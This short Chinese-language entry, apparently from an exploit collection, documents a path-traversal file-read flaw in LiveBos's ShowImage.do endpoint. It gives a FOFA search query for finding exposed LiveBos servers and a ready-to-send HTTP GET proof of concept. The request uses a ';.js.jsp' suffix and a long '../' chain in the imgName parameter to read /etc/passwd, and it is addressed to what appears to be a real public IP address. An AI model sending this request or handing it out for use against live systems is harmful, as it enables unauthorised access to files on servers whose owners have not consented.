# LiveBos ShowImage.do 文件 imgName 参数读取漏洞

    ## fofa

```
body="LiveBos" || body="/react/browser/loginBackground.png"
```

## poc

```
GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 112.35.7.97:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip


```
